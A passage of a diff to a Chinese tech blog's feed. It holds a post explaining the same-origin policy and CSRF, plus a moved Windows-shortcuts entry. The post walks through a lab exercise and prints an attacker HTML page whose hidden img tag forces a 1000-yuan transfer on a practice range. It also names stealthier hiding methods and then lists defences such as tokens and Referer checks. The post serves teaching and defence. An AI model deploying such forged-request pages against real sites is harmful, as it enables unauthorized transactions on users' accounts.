title="缺陷"></a>缺陷</h3><p>同源策略仅适用于脚本，这意味着某网站可以通过相应的HTML标签访问不同来源网站上的图像、CSS和动态加载脚本等资源。而<strong>跨站请求伪造（CSRF）</strong>就是利用同源策略不适用于HTML标签的缺陷。</p><h3 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h3><ul><li>定义：挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li><li>与XSS的比较：XSS利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</li><li>攻击方法：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</li><li>特点：攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户的浏览器，让其以用户的名义运行操作。</li></ul><h3 id="攻击实践"><a href="#攻击实践" class="headerlink" title="攻击实践"></a>攻击实践</h3><p>此处以必火靶场的CSRF-GET型攻击进行实践。</p><p><a href="http://www.nanhack.com/payload/xss/csrf1.php">靶场地址</a></p><img src="https://i.loli.net/2021/01/28/OvsXaEwmDHkrVKc.png" alt="image-20210128110300151" style="zoom: 50%;" /><p>正常转账操作：<a href="http://www.nanhack.com/payload/xss/csrf1.php?name=admin&amp;money=10">http://www.nanhack.com/payload/xss/csrf1.php?name=admin&amp;money=10</a></p><p>恶意攻击者页面：<a href="http://www.nanhack.com/payload/xss/csrf1.php">http://www.nanhack.com/payload/xss/csrf1.php</a></p><p>访问恶意攻击者页面产生CSRF请求： <a href="http://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000">http://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000</a></p><img src="https://i.loli.net/2021/01/28/g3e5GyOxVK9LcqI.png" alt="image-20210128111355278" style="zoom:67%;" /><p>打开恶意攻击页面，发现是一个图片，提示：你的账户 钱少了。</p><p>返回查看，果然，账户少了1000元。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>你的账户钱少了吧<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script&gt;alert(&#x27;你的账户钱少了吧！！😳&#x27;);&lt;/script&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.tv/meinv/tila.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;30%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;a href=&quot;http://www.nanhack.com/user.php&quot;&gt;返回用户管理&lt;/a&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;img src&gt;</code>中的链接就是构造了一个“转账”链接。</p><p>但是这种恶意链接构造的CSRF隐蔽性很低，很容易被发现。</p><p>可以利用一些更加隐藏的方式：</p><ul><li>CSS中background属性里的url链接</li><li>利用a标签</li><li>设置iframe的style为display:none</li></ul><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ul><li><p>令牌同步</p><p>令牌同步模式（英语：Synchronizer token pattern，简称STP）。原理是：当用户发送请求时，服务器端应用将令牌（token，一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。</p><p>局限性：会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话（session）等级的令牌代替的话，服务器的负担将没有那么重。</p></li><li><p>检查Referer字段</p><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，这时候服务器就能识别出恶意的访问。</p><p>局限性：因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p></li><li><p>添加校验token</p><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再运行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p></li></ul><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ol><li>IETF [rfc:6265 HTTP State Management Mechanism, Apr, 2011]</li><li>Kemp, John. Security on the Web. 2011-02-04 [2018-07-24]. </li><li>Ristic, Ivan. Apache Security. O’Reilly Media. 2005: 280. ISBN 0-596-00724-8.</li><li>阮一峰的网络日志</li><li>MDN Web Docs</li></ol>]]></content>
+    <content type="html"><![CDATA[<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>同源策略是指在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须同源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。</p><p>同源的判断如下：</p><ul><li>协议相同</li><li>域名相同</li><li>端口相同</li></ul><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>同源策略对Web应用程序具有特殊意义，因为Web应用程序广泛依赖于cookie来维持用户会话，所以必须将不相关网站严格分隔，以防止丢失数据泄露。</p><h3 id="同源比较"><a href="#同源比较" class="headerlink" title="同源比较"></a>同源比较</h3><p>下表列出哪些URL与<a href="http://www.example.com/dir/page.html">http://www.example.com/dir/page.html</a> 属于相同来源</p><table><thead><tr><th>http:&#x2F;&#x2F;<strong>en.example.com</strong>&#x2F;dir&#x2F;other.html</th><th>否</th><th>不同域名</th></tr></thead><tbody><tr><td>http:&#x2F;&#x2F;<strong>example.com</strong>&#x2F;dir&#x2F;other.html</td><td>否</td><td>不同域名（需要完全匹配）</td></tr><tr><td>**http:&#x2F;&#x2F;**username:<a href="mailto:&#x70;&#x61;&#x73;&#x73;&#x77;&#111;&#114;&#x64;&#64;&#119;&#119;&#119;&#x2e;&#x65;&#120;&#97;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#99;&#111;&#x6d;">&#x70;&#x61;&#x73;&#x73;&#x77;&#111;&#114;&#x64;&#64;&#119;&#119;&#119;&#x2e;&#x65;&#120;&#97;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#99;&#111;&#x6d;</a>&#x2F;dir2&#x2F;other.html</td><td>是</td><td>只有路径不同</td></tr><tr><td><a href="http://v2.www.example.com/dir/other.html">http://v2.www.example.com/dir/other.html</a></td><td>否</td><td>不同域名（需要完全匹配）</td></tr><tr><td><a href="http://www.example.com:**81**/dir/other.html">http://www.example.com:**81**/dir/other.html</a></td><td>否</td><td>不同端口（若未标明，http:&#x2F;&#x2F; 默认端口号为80）</td></tr><tr><td><strong><a href="http://www.example.com/">http://www.example.com</a></strong>&#x2F;dir&#x2F;page2.html</td><td>是</td><td>只有路径不同</td></tr><tr><td><strong><a href="http://www.example.com/">http://www.example.com</a></strong>&#x2F;dir2&#x2F;other.html</td><td>是</td><td>只有路径不同</td></tr><tr><td><strong>https</strong>:&#x2F;&#x2F;<a href="http://www.example.com/dir/other.html">www.example.com/dir/other.html</a></td><td>否</td><td>不同协议（<a href="https://zh.wikipedia.org/wiki/Https">https</a>和<a href="https://zh.wikipedia.org/wiki/Http">http</a>）</td></tr></tbody></table><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>源的继承：在页面中通过 <code>about:blank</code> 或 <code>javascript:</code> URL 执行的脚本会继承打开该 URL 的文档的源，因为这些类型的 URLs 没有包含源服务器的相关信息。</li><li>跨源访问：可以使用 CORS 来允许跨源访问。CORS 是 HTTP 的一部分，它允许服务端来指定哪些主机可以从这个服务端加载资源。</li><li>源的更改：满足某些限制条件的情况下，页面是可以修改它的源。脚本可以将 document.domain 的值设置为其当前域或其当前域的父域。如果将其设置为其当前域的父域，则这个较短的父域将用于后续源检查。</li></ul><h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>同源策略仅适用于脚本，这意味着某网站可以通过相应的HTML标签访问不同来源网站上的图像、CSS和动态加载脚本等资源。而<strong>跨站请求伪造（CSRF）</strong>就是利用同源策略不适用于HTML标签的缺陷。</p><h3 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h3><ul><li>定义：挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li><li>与XSS的比较：XSS利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</li><li>攻击方法：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</li><li>特点：攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户的浏览器，让其以用户的名义运行操作。</li></ul><h3 id="攻击实践"><a href="#攻击实践" class="headerlink" title="攻击实践"></a>攻击实践</h3><p>此处以必火靶场的CSRF-GET型攻击进行实践。</p><p><a href="http://www.nanhack.com/payload/xss/csrf1.php">靶场地址</a></p><img src="https://i.loli.net/2021/01/28/OvsXaEwmDHkrVKc.png" alt="image-20210128110300151" style="zoom: 50%;" /><p>正常转账操作：<a href="http://www.nanhack.com/payload/xss/csrf1.php?name=admin&amp;money=10">http://www.nanhack.com/payload/xss/csrf1.php?name=admin&amp;money=10</a></p><p>恶意攻击者页面：<a href="http://www.nanhack.com/payload/xss/csrf1.php">http://www.nanhack.com/payload/xss/csrf1.php</a></p><p>访问恶意攻击者页面产生CSRF请求： <a href="http://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000">http://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000</a></p><img src="https://i.loli.net/2021/01/28/g3e5GyOxVK9LcqI.png" alt="image-20210128111355278" style="zoom:67%;" /><p>打开恶意攻击页面，发现是一个图片，提示：你的账户 钱少了。</p><p>返回查看，果然，账户少了1000元。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>你的账户钱少了吧<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script&gt;alert(&#x27;你的账户钱少了吧！！😳&#x27;);&lt;/script&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.tv/meinv/tila.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;30%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.nanhack.com/payload/xss/csrf1.php?name=zsm&amp;money=1000&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;a href=&quot;http://www.nanhack.com/user.php&quot;&gt;返回用户管理&lt;/a&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;img src&gt;</code>中的链接就是构造了一个“转账”链接。</p><p>但是这种恶意链接构造的CSRF隐蔽性很低，很容易被发现。</p><p>可以利用一些更加隐藏的方式：</p><ul><li>CSS中background属性里的url链接</li><li>利用a标签</li><li>设置iframe的style为display:none</li></ul><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ul><li><p>令牌同步</p><p>令牌同步模式（英语：Synchronizer token pattern，简称STP）。原理是：当用户发送请求时，服务器端应用将令牌（token，一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。</p><p>局限性：会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话（session）等级的令牌代替的话，服务器的负担将没有那么重。</p></li><li><p>检查Referer字段</p><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，这时候服务器就能识别出恶意的访问。</p><p>局限性：因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p></li><li><p>添加校验token</p><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再运行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p></li></ul><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ol><li>IETF [rfc:6265 HTTP State Management Mechanism, Apr, 2011]</li><li>Kemp, John. Security on the Web. 2011-02-04 [2018-07-24]. </li><li>Ristic, Ivan. Apache Security. O’Reilly Media. 2005: 280. ISBN 0-596-00724-8.</li><li>阮一峰的网络日志</li><li>MDN Web Docs</li></ol>]]></content>
     
     
       
@@ -1676,33 +1689,6 @@
   </entry>
   
   <entry>
-    <title>Windows快捷键</title>
-    <link href="http://h4m5t.github.io/2020/10/26/Win10/"/>
-    <id>http://h4m5t.github.io/2020/10/26/Win10/</id>
-    <published>2020-10-25T16:00:00.000Z</published>
-    <updated>2022-12-04T11:39:07.042Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="win10快捷键"><a href="#win10快捷键" class="headerlink" title="win10快捷键"></a>win10快捷键</h3><ul><li><p>win+E  打开我的电脑</p></li><li><p>win+D  打开桌面</p></li><li><p>win+S&#x2F;Q  搜索</p></li><li><p>win+M  全部窗口最小化</p></li><li><p>win+V  打开剪切板</p></li><li><p>win+W  打开白板</p></li><li><p>win+Shift+S  截屏</p></li><li><p>win+Tab  新建电脑桌面</p></li><li><p>Win+Ctrl+D  新建电脑桌面</p></li><li><p>Win+Ctrl+(←&#x2F;→)  虚拟桌面间切换</p></li><li><p>win+(↓\↑)  窗口大小</p></li><li><p>win+I  打开设置</p></li><li><p>Win+数字键：打开任务栏上第n个程序</p></li><li><p>Alt+Tab：快速切换窗口</p></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;win10快捷键&quot;&gt;&lt;a href=&quot;#win10快捷键&quot; class=&quot;headerlink&quot; title=&quot;win10快捷键&quot;&gt;&lt;/a&gt;win10快捷键&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;win+E  打开我的电脑&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;win+D </summary>
-      
-    
-    
-    
-    <category term="blog" scheme="http://h4m5t.github.io/categories/blog/"/>
-    
-    
-    <category term="Win10" scheme="http://h4m5t.github.io/tags/Win10/"/>
-    
-  </entry>
-  
-  <entry>
     <title>Chrome快捷键</title>
     <link href="http://h4m5t.github.io/2020/10/26/Chrome/"/>
     <id>http://h4m5t.github.io/2020/10/26/Chrome/</id>
@@ -1726,6 +1712,33 @@
     
     
     <category term="Chrome" scheme="http://h4m5t.github.io/tags/Chrome/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows快捷键</title>
+    <link href="http://h4m5t.github.io/2020/10/26/Win10/"/>
+    <id>http://h4m5t.github.io/2020/10/26/Win10/</id>
+    <published>2020-10-25T16:00:00.000Z</published>
+    <updated>2022-12-04T11:39:07.042Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="win10快捷键"><a href="#win10快捷键" class="headerlink" title="win10快捷键"></a>win10快捷键</h3><ul><li><p>win+E  打开我的电脑</p></li><li><p>win+D  打开桌面</p></li><li><p>win+S&#x2F;Q  搜索</p></li><li><p>win+M  全部窗口最小化</p></li><li><p>win+V  打开剪切板</p></li><li><p>win+W  打开白板</p></li><li><p>win+Shift+S  截屏</p></li><li><p>win+Tab  新建电脑桌面</p></li><li><p>Win+Ctrl+D  新建电脑桌面</p></li><li><p>Win+Ctrl+(←&#x2F;→)  虚拟桌面间切换</p></li><li><p>win+(↓\↑)  窗口大小</p></li><li><p>win+I  打开设置</p></li><li><p>Win+数字键：打开任务栏上第n个程序</p></li><li><p>Alt+Tab：快速切换窗口</p></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;win10快捷键&quot;&gt;&lt;a href=&quot;#win10快捷键&quot; class=&quot;headerlink&quot; title=&quot;win10快捷键&quot;&gt;&lt;/a&gt;win10快捷键&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;win+E  打开我的电脑&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;win+D </summary>
+      
+    
+    
+    
+    <category term="blog" scheme="http://h4m5t.github.io/categories/blog/"/>
+    
+    
+    <category term="Win10" scheme="http://h4m5t.github.io/tags/Win10/"/>
     
   </entry>
   
